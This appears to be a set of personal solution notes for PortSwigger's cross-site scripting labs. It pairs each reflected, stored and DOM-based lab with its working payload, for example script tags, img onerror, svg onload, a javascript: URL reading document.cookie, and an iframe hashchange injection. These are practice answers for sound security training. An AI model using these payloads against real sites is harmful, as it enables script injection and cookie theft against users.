# Cross-Site Scripting (XSS)  

## PortSwigger  

XSS Cheat Sheet  
[https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)  

XSS Labs  
[https://portswigger.net/web-security/all-labs#cross-site-scripting](https://portswigger.net/web-security/all-labs#cross-site-scripting)  

### Reflected XSS  
Reflected XSS into HTML context with nothing encoded  
[https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)
```
<script>alert(1)</script>
```  

Reflected XSS into attribute with angle brackets HTML-encoded  
[https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded)  
```
"onmouseover="alert(1)
```  

### Stored XSS  
Stored XSS into HTML context with nothing encoded  
[https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded)
```
<script>alert(1)</script>
```  

### DOM XSS  

DOM XSS in `document.write` sink using source `location.search`  
[https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)  
```
"><svg onload=alert(1)>
```  

DOM XSS in `innerHTML` sink using source `location.search`  
[https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink)  
```
<img src=1 onerror=alert(1)>
```  

DOM XSS in jQuery anchor `href` attribute sink using `location.search` source  
[https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink)  
```
javascript:alert(document.cookie)
```  

DOM XSS in jQuery selector sink using a `hashchange` event  
[https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)  
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```  
